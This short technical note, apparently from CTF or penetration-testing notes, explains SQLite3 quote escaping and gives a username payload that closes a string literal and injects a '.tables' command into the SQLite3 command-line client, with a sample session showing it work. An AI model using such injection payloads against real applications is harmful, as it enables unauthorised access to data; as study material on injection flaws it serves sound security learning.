In SQLite3, you need to escape ' and " in a string literal by putting the same character twice instead of prepending backslashes.


In CLI version of SQLite3, by combinating " and ;, you can end SQL statement and then execute next query or SQLite3 commands.
	Username Payload:
		";\n.tables\n

	sqlite> SELECT * FROM users WHERE username="\"\;
	Error: unrecognized token: "\"
	sqlite> .tables
	users
